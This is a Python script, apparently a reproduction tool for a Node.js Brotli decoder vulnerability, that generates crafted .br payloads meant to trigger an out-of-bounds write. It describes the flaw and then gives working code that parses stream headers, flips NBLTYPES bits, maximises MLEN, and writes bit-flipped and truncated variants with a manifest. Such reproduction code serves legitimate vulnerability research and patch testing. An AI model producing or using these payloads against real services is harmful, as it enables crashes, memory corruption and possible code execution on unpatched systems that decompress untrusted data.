#!/usr/bin/env python3
"""
CVE-2026-111497 reproduction: craft malformed Brotli streams.

The vulnerability is an OOB write in Node.js's bundled Brotli decoder.
DecodeBlockTypeAndLength() returns false when max_block_type <= 1,
but the unsafe (fast) decoding path silently ignores this return value,
allowing decoding to continue past allocated memory.

Strategy: compress varied data at quality 11 to force multi-block-type output,
then flip NBLTYPES bits to trigger the vulnerable code path.
"""

import brotli
import os
import json
import random
import string

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))


class BitReader:
    """Read bits from a byte buffer (LSB-first, matching Brotli's convention)."""

    def __init__(self, data: bytes):
        self.data = bytearray(data)
        self.bit_pos = 0

    def read_bits(self, n: int) -> int:
        val = 0
        for i in range(n):
            byte_idx = (self.bit_pos + i) // 8
            bit_idx = (self.bit_pos + i) % 8
            if byte_idx < len(self.data):
                val |= ((self.data[byte_idx] >> bit_idx) & 1) << i
        self.bit_pos += n
        return val

    @property
    def pos(self):
        return self.bit_pos


class BitWriter:
    """Modify bits in a byte buffer (LSB-first)."""

    def __init__(self, data: bytes):
        self.data = bytearray(data)

    def set_bit(self, bit_pos: int, value: int):
        byte_idx = bit_pos // 8
        bit_idx = bit_pos % 8
        if value:
            self.data[byte_idx] |= (1 << bit_idx)
        else:
            self.data[byte_idx] &= ~(1 << bit_idx)

    def flip_bit(self, bit_pos: int):
        byte_idx = bit_pos // 8
        bit_idx = bit_pos % 8
        self.data[byte_idx] ^= (1 << bit_idx)

    def get_bytes(self) -> bytes:
        return bytes(self.data)


def parse_wbits(reader: BitReader) -> int:
    first = reader.read_bits(1)
    if first == 0:
        return 16
    n = reader.read_bits(3)
    wbits = 17 + n
    if wbits == 24:
        extra = reader.read_bits(1)
        wbits += extra
    return wbits


def parse_varint_uint8(reader: BitReader) -> int:
    first = reader.read_bits(1)
    if first == 0:
        return 0
    n = reader.read_bits(3)
    if n == 0:
        return 1
    extra = reader.read_bits(n)
    return (1 << n) + extra


def find_nbltypes_positions(data: bytes, verbose=True):
    reader = BitReader(data)
    wbits = parse_wbits(reader)
    if verbose:
        print(f"  WBITS = {wbits} (parsed {reader.pos} bits)")

    islast = reader.read_bits(1)
    if verbose:
        print(f"  ISLAST = {islast}")

    if islast:
        isempty = reader.read_bits(1)
        if verbose:
            print(f"  ISEMPTY = {isempty}")
        if isempty:
            return None

    mnibbles_raw = reader.read_bits(2)
    if mnibbles_raw == 3:
        reserved = reader.read_bits(1)
        if reserved == 0:
            return None
        return None

    mnibbles = mnibbles_raw + 4
    mlen_bits = mnibbles * 4
    mlen_minus1 = reader.read_bits(mlen_bits)
    mlen = mlen_minus1 + 1
    if verbose:
        print(f"  MNIBBLES = {mnibbles}, MLEN = {mlen}")

    if not islast:
        isuncompressed = reader.read_bits(1)
        if verbose:
            print(f"  ISUNCOMPRESSED = {isuncompressed}")
        if isuncompressed:
            return None

    positions = []
    names = ["NBLTYPES_L", "NBLTYPES_I", "NBLTYPES_D"]

    for i, name in enumerate(names):
        pos_before = reader.pos
        value = parse_varint_uint8(reader)
        nbltypes = value + 1
        pos_after = reader.pos
        if verbose:
            print(f"  {name} = {nbltypes} at bits [{pos_before}:{pos_after}]"
                  + (" ***" if nbltypes > 1 else ""))
        positions.append({
            "name": name,
            "start_bit": pos_before,
            "end_bit": pos_after,
            "nbltypes": nbltypes,
        })

    return positions


def make_diverse_data(size: int, seed: int = 42) -> bytes:
    """Generate data with highly varied statistical properties to force
    the Brotli encoder to use multiple block types at quality 11."""
    rng = random.Random(seed)
    chunks = []
    remaining = size

    patterns = [
        # English-like text (low entropy, ASCII letters dominate)
        lambda n: bytes(rng.choices(b'etaoinshrdlu ETAOINSHRDLU', k=n)),
        # Numeric sequences
        lambda n: bytes(rng.choices(b'0123456789.-,+', k=n)),
        # Binary-like high-entropy data
        lambda n: bytes(rng.getrandbits(8) for _ in range(n)),
        # Repeated patterns (very low entropy)
        lambda n: (b'\x00\x01\x02\x03' * ((n // 4) + 1))[:n],
        # HTML/XML-like markup
        lambda n: bytes(rng.choices(b'<div class="foo">bar</div>\n', k=n)),
        # Structured JSON-like
        lambda n: bytes(rng.choices(b'{"key":"value","num":12345},\n', k=n)),
        # Mostly zeros with occasional spikes
        lambda n: bytes(0 if rng.random() > 0.05 else rng.getrandbits(8) for _ in range(n)),
        # Base64-like alphabet
        lambda n: bytes(rng.choices(
            b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=', k=n)),
    ]

    chunk_size = max(256, size // (len(patterns) * 3))
    pattern_idx = 0

    while remaining > 0:
        n = min(chunk_size + rng.randint(-chunk_size//4, chunk_size//4), remaining)
        if n <= 0:
            n = remaining
        pattern_fn = patterns[pattern_idx % len(patterns)]
        chunks.append(pattern_fn(n))
        remaining -= n
        pattern_idx += 1

    return b''.join(chunks)[:size]


def craft_nbltypes_flip(original: bytes, flip_index: int) -> bytes:
    positions = find_nbltypes_positions(original, verbose=False)
    if not positions:
        return None

    target = positions[flip_index]
    if target["nbltypes"] <= 1:
        return None

    writer = BitWriter(original)
    bit_pos = target["start_bit"]
    current = (original[bit_pos // 8] >> (bit_pos % 8)) & 1
    if current != 1:
        return None

    writer.set_bit(bit_pos, 0)
    return writer.get_bytes()


def craft_header_bit_flips(original: bytes, positions) -> list:
    """Flip individual bits in the header region around NBLTYPES fields."""
    results = []
    if not positions:
        return results

    first_nbl = positions[0]["start_bit"]
    last_nbl = positions[-1]["end_bit"]

    # Flip bits in and around the NBLTYPES region
    for bit_offset in range(max(0, first_nbl - 4), min(last_nbl + 16, len(original) * 8)):
        writer = BitWriter(original)
        writer.flip_bit(bit_offset)
        results.append((f"bitflip_{bit_offset}", writer.get_bytes()))

    return results


def generate_payloads():
    payloads = []

    # Generate diverse seeds to force multi-block-type encoding
    configs = [
        (65536, 42),
        (131072, 99),
        (262144, 7),
        (524288, 123),
        (1048576, 55),  # 1MB - larger data more likely to get multi-block
    ]

    for size, seed in configs:
        data = make_diverse_data(size, seed)
        try:
            compressed = brotli.compress(data, quality=11, lgwin=22)
        except Exception as e:
            print(f"  Compression failed for size {size}: {e}")
            continue

        print(f"\n--- Seed: {size}B (seed={seed}) -> {len(compressed)}B compressed ---")

        positions = find_nbltypes_positions(compressed)
        if not positions:
            print("  Could not parse header")
            continue

        has_multi = any(p["nbltypes"] > 1 for p in positions)
        if not has_multi:
            print("  All NBLTYPES=1, encoder didn't use multiple block types")

            # Still generate bit-flip payloads around the header
            flips = craft_header_bit_flips(compressed, positions)
            for name, data_bytes in flips[:10]:  # Limit to 10 per seed
                payloads.append((f"s{size}_{name}", data_bytes))
            continue

        # Found multi-block-type encoding! Craft NBLTYPES flip payloads
        for idx in range(3):
            if positions[idx]["nbltypes"] > 1:
                modified = craft_nbltypes_flip(compressed, idx)
                if modified:
                    name = f"s{size}_nblflip_{positions[idx]['name']}"
                    payloads.append((name, modified))
                    print(f"  Crafted: {name} (flipped {positions[idx]['name']} "
                          f"from {positions[idx]['nbltypes']} to 1)")

        # Also craft bit-flip variants
        flips = craft_header_bit_flips(compressed, positions)
        for name, data_bytes in flips[:8]:
            payloads.append((f"s{size}_{name}", data_bytes))

        # Truncation variants
        for frac in [0.1, 0.25, 0.5]:
            trunc_len = max(8, int(len(compressed) * frac))
            payloads.append((f"s{size}_trunc{int(frac*100)}pct", compressed[:trunc_len]))

    # Also try: take a quality-11 compressed file and corrupt MLEN to be huge,
    # while NBLTYPES stays at 1. This makes the decoder try to process more
    # literals than block_length[0] allows (1<<24), triggering the block switch.
    print("\n--- Crafting MLEN-overflow payloads ---")
    for size in [65536, 262144]:
        data = make_diverse_data(size, 42)
        compressed = brotli.compress(data, quality=11, lgwin=22)
        positions = find_nbltypes_positions(compressed, verbose=False)
        if not positions:
            continue

        # Set MLEN to maximum possible value by setting all MLEN bits to 1
        reader = BitReader(compressed)
        parse_wbits(reader)
        reader.read_bits(1)  # ISLAST

        # Check if ISLAST
        temp_reader = BitReader(compressed)
        parse_wbits(temp_reader)
        islast_val = temp_reader.read_bits(1)

        if islast_val:
            temp_reader.read_bits(1)  # ISEMPTY

        mnibbles_raw = temp_reader.read_bits(2)
        if mnibbles_raw == 3:
            continue
        mnibbles = mnibbles_raw + 4
        mlen_start_bit = temp_reader.pos
        mlen_bits = mnibbles * 4

        writer = BitWriter(compressed)
        # Set all MLEN bits to 1 (maximum MLEN for this nibble count)
        for b in range(mlen_bits):
            writer.set_bit(mlen_start_bit + b, 1)
        max_mlen = (1 << mlen_bits) - 1 + 1
        print(f"  s{size}_mlen_max: MLEN bits [{mlen_start_bit}:{mlen_start_bit+mlen_bits}] "
              f"set to all 1s -> MLEN={max_mlen}")
        payloads.append((f"s{size}_mlen_max", writer.get_bytes()))

    # Write payloads
    payload_dir = os.path.join(OUTPUT_DIR, "payloads")
    os.makedirs(payload_dir, exist_ok=True)

    manifest = []
    for name, data in payloads:
        path = os.path.join(payload_dir, f"{name}.br")
        with open(path, "wb") as f:
            f.write(data)
        manifest.append({"name": name, "path": path, "size": len(data)})

    manifest_path = os.path.join(payload_dir, "manifest.json")
    with open(manifest_path, "w") as f:
        json.dump(manifest, f, indent=2)

    print(f"\nTotal payloads: {len(payloads)}")
    print(f"Manifest: {manifest_path}")
    return manifest_path


if __name__ == "__main__":
    generate_payloads()
